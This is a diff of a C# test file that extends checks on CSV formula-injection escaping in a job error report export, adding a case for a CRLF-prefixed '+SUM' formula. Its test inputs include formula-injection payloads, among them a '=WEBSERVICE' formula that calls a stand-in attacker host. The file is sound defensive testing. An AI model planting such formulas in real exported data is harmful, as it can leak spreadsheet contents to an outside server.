@@ -292,6 +292,7 @@ public sealed class Stage9XlsxReportsAndDashboardTests(DataSourcesApiFixture fix
             "   =WEBSERVICE(\"https://evil.example\")",
             "\t+1",
             "\n=1+1",
+            "\r\n+SUM(A1:A2)",
             "Line1,\r\n\"Quoted\""
         };
 
@@ -336,7 +337,14 @@ public sealed class Stage9XlsxReportsAndDashboardTests(DataSourcesApiFixture fix
         Assert.Equal("'   =WEBSERVICE(\"https://evil.example\")", rawItems[4]);
         Assert.Equal("'\t+1", rawItems[5]);
         Assert.Equal("'\n=1+1", rawItems[6]);
-        Assert.Equal("Line1,\r\n\"Quoted\"", rawItems[7]);
+        Assert.Equal("'\r\n+SUM(A1:A2)", rawItems[7]);
+        Assert.Equal("Line1,\r\n\"Quoted\"", rawItems[8]);
+
+        // Direct CSV cell formatting with leading CRLF + formula trigger neutralizes and quotes per RFC 4180
+        var formattedCrlfFormula = JobErrorReportWriter.FormatCsvCell("\r\n+SUM(A1:A2)");
+        Assert.Equal("\"'\r\n+SUM(A1:A2)\"", formattedCrlfFormula);
+        var singleCellParsed = ParseReportCsv(JobErrorReportWriter.HeaderLine + $"3,f,c,{formattedCrlfFormula},[]\r\n");
+        Assert.Equal("'\r\n+SUM(A1:A2)", Assert.Single(singleCellParsed).Message);
 
         // Another user or missing job must receive 404 Problem Details
         using var otherClient = fixture.CreateClient(new() { BaseAddress = new("https://localhost") });
